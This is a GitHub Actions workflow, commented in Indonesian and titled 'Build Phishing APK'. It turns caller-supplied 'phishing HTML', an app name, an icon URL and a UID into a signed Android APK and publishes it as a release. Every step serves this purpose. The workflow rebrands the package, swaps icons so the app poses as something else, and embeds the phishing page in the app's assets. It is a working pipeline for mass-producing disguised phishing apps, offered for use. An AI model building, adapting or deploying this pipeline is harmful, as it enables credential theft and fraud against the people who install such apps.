name: Build Phishing APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: 'Nama aplikasi (label APK)'
        required: true
        default: 'NeXsus Infinity'
      html_content:
        description: 'Isi HTML phishing'
        required: true
      icon_url:
        description: 'URL icon (dari catbox/imgbb)'
        required: false
        default: ''
      uid:
        description: 'UID akun'
        required: true
      package_name:
        description: 'Package name APK'
        required: false
        default: 'com.sync.xxx'

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v4
        with:
          packages: ''

      - name: Setup Gradle cache
        uses: gradle/gradle-build-action@v2

      # ─── Override app label ───
      - name: Override app label
        shell: bash
        run: |
          cd android
          APP_NAME="${{ github.event.inputs.app_name }}"
          APP_NAME_ESC=$(echo "$APP_NAME" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')
          STRINGS_FILE="app/src/main/res/values/strings.xml"
          mkdir -p "$(dirname "$STRINGS_FILE")"
          cat > "$STRINGS_FILE" <<EOF
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <string name="app_name">${APP_NAME_ESC}</string>
          </resources>
          EOF
          echo "✅ App label set to: $APP_NAME"

      # ─── Override package name ───
      - name: Override package name
        shell: bash
        run: |
          set -e
          cd android
          NEW_PKG="${{ github.event.inputs.package_name }}"
          if [ -z "$NEW_PKG" ]; then NEW_PKG="com.sync.xxx"; fi

          OLD_PKG=""
          if [ -f app/build.gradle.kts ]; then
            OLD_PKG=$(grep -oP 'namespace\s*=\s*"\K[^"]+' app/build.gradle.kts | head -1 || true)
            if [ -z "$OLD_PKG" ]; then
              OLD_PKG=$(grep -oP 'applicationId\s*=\s*"\K[^"]+' app/build.gradle.kts | head -1 || true)
            fi
          fi
          if [ -z "$OLD_PKG" ] && [ -f app/build.gradle ]; then
            OLD_PKG=$(grep -oP 'namespace\s+"\K[^"]+' app/build.gradle | head -1 || true)
            if [ -z "$OLD_PKG" ]; then
              OLD_PKG=$(grep -oP 'applicationId\s+"\K[^"]+' app/build.gradle | head -1 || true)
            fi
          fi

          if [ -z "$OLD_PKG" ]; then
            echo "⚠️ Tidak bisa deteksi OLD package, pakai default com.sync.xxx"
            OLD_PKG="com.sync.xxx"
          fi

          echo "Old package: $OLD_PKG → New package: $NEW_PKG"

          if [ "$OLD_PKG" = "$NEW_PKG" ]; then
            echo "✅ Package sudah sama, skip replace"
            exit 0
          fi

          if [ -f app/build.gradle.kts ]; then
            sed -i "s/namespace = \"$OLD_PKG\"/namespace = \"$NEW_PKG\"/g" app/build.gradle.kts
            sed -i "s/applicationId = \"$OLD_PKG\"/applicationId = \"$NEW_PKG\"/g" app/build.gradle.kts
            echo "✅ build.gradle.kts updated"
          fi
          if [ -f app/build.gradle ]; then
            sed -i "s/namespace \"$OLD_PKG\"/namespace \"$NEW_PKG\"/g" app/build.gradle
            sed -i "s/applicationId \"$OLD_PKG\"/applicationId \"$NEW_PKG\"/g" app/build.gradle
            echo "✅ build.gradle updated"
          fi

          OLD_PATH="app/src/main/java/$(echo $OLD_PKG | tr '.' '/')"
          NEW_PATH="app/src/main/java/$(echo $NEW_PKG | tr '.' '/')"
          if [ -d "$OLD_PATH" ]; then
            mkdir -p "$(dirname "$NEW_PATH")"
            mv "$OLD_PATH" "$NEW_PATH"
            echo "✅ Source folder moved: $OLD_PATH → $NEW_PATH"
          else
            echo "⚠️ Folder source tidak ditemukan di $OLD_PATH"
          fi

          find app/src -type f \( -name "*.kt" -o -name "*.java" \) -exec \
            sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} +

          MANIFEST="app/src/main/AndroidManifest.xml"
          if [ -f "$MANIFEST" ]; then
            if grep -q 'package="' "$MANIFEST"; then
              sed -i "s/package=\"$OLD_PKG\"/package=\"$NEW_PKG\"/g" "$MANIFEST"
              echo "✅ Manifest package attribute updated"
            else
              echo "ℹ️ Manifest tidak punya package attribute (normal di AGP modern)"
            fi
            sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" "$MANIFEST"
          fi

          find app/src/main/res -type f -name "*.xml" -exec \
            sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} + 2>/dev/null || true

          echo "🔍 Verifying package replacement..."
          if [ -f app/build.gradle.kts ]; then
            grep -E "namespace|applicationId" app/build.gradle.kts | grep "$NEW_PKG" && echo "✅ namespace/applicationId verified" || echo "❌ MISMATCH in gradle.kts!"
          fi
          if [ -f app/build.gradle ]; then
            grep -E "namespace|applicationId" app/build.gradle | grep "$NEW_PKG" && echo "✅ namespace/applicationId verified" || echo "❌ MISMATCH in gradle!"
          fi
          if [ -d "$NEW_PATH" ]; then
            echo "✅ New source folder exists: $NEW_PATH"
          else
            echo "⚠️ New source folder tidak ada, tapi mungkin project pakai struktur lain"
          fi

      # ─── Set icon from URL ───
      - name: Set icon from URL
        shell: bash
        run: |
          cd android
          ICON_URL="${{ github.event.inputs.icon_url }}"
          if [ -z "$ICON_URL" ]; then
            echo "ℹ️ No icon provided, using default."
            exit 0
          fi

          sudo apt-get update -qq
          sudo apt-get install -y -qq imagemagick wget

          echo "⬇️ Downloading icon from: $ICON_URL"
          wget -q -O /tmp/custom_icon_raw "$ICON_URL" || curl -sL "$ICON_URL" -o /tmp/custom_icon_raw

          if [ ! -s /tmp/custom_icon_raw ]; then
            echo "❌ Gagal download icon dari URL"
            exit 1
          fi

          echo "🖼️ Converting to PNG..."
          convert /tmp/custom_icon_raw /tmp/custom_icon.png || {
            echo "❌ Gagal convert icon, mungkin bukan gambar valid"
            exit 1
          }

          for d in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
            DIR="app/src/main/res/mipmap-$d"
            mkdir -p "$DIR"
            case $d in
              mdpi)    SZ=48  ;;
              hdpi)    SZ=72  ;;
              xhdpi)   SZ=96  ;;
              xxhdpi)  SZ=144 ;;
              xxxhdpi) SZ=192 ;;
            esac
            convert /tmp/custom_icon.png -resize ${SZ}x${SZ} "$DIR/ic_launcher.png"
            convert /tmp/custom_icon.png -resize ${SZ}x${SZ} "$DIR/ic_launcher_round.png" 2>/dev/null || true
          done
          echo "✅ Icons replaced"

      # ─── Inject HTML phishing ───
      - name: Inject HTML content
        shell: bash
        env:
          HTML_CONTENT: ${{ github.event.inputs.html_content }}
        run: |
          cd android
          mkdir -p app/src/main/assets
          printf '%s' "$HTML_CONTENT" > app/src/main/assets/index.html
          echo "✅ index.html written ($(wc -c < app/src/main/assets/index.html) bytes)"

      # ─── Inject UID ───
      - name: Inject UID
        shell: bash
        run: |
          cd android
          mkdir -p app/src/main/assets
          echo "{\"uid\":\"${{ github.event.inputs.uid }}\"}" > app/src/main/assets/uid.json
          echo "✅ uid.json written: ${{ github.event.inputs.uid }}"

      # ─── Setup signing ───
      - name: Setup debug keystore
        shell: bash
        run: |
          mkdir -p ~/.android
          keytool -genkey -v \
            -keystore ~/.android/debug.keystore \
            -storepass android \
            -alias androiddebugkey \
            -keypass android \
            -keyalg RSA \
            -keysize 2048 \
            -validity 10000 \
            -dname "CN=Android Debug,O=Android,C=US" 2>/dev/null || true

      # ─── Build APK ───
      - name: Build APK
        shell: bash
        run: |
          cd android
          if [ ! -f "./gradlew" ]; then
            echo "⚠️ gradlew tidak ditemukan, mendownload Gradle 8.5 secara manual..."
            wget -q https://services.gradle.org/distributions/gradle-8.5-bin.zip
            unzip -q gradle-8.5-bin.zip
            chmod +x ./gradle-8.5/bin/gradle
            ./gradle-8.5/bin/gradle assembleRelease --stacktrace
          else
            echo "✅ gradlew ditemukan, memulai build..."
            chmod +x ./gradlew
            ./gradlew assembleRelease --stacktrace
          fi

      # ─── Rename & locate APK ───
      - name: Rename APK
        shell: bash
        run: |
          APK_PATH=$(find android/app/build/outputs/apk/release -name "*.apk" | head -1)
          if [ -z "$APK_PATH" ]; then
            echo "❌ APK tidak ditemukan!"
            exit 1
          fi
          cp "$APK_PATH" ./SyncXxX.apk
          ls -lh SyncXxX.apk
          echo "✅ APK siap: $(du -h SyncXxX.apk | cut -f1)"

      # ─── Upload ke Release ───
      - name: Create Release & Upload APK
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ github.run_id }}
          name: "Build ${{ github.run_number }} — ${{ github.event.inputs.app_name }}"
          body: |
            **App Name:** ${{ github.event.inputs.app_name }}
            **Package:** ${{ github.event.inputs.package_name }}
            **UID:** ${{ github.event.inputs.uid }}
            **Run:** #${{ github.run_number }}
          files: SyncXxX.apk
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # ─── Upload artifact (backup) ───
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: SyncXxX-apk
          path: SyncXxX.apk
          retention-days: 30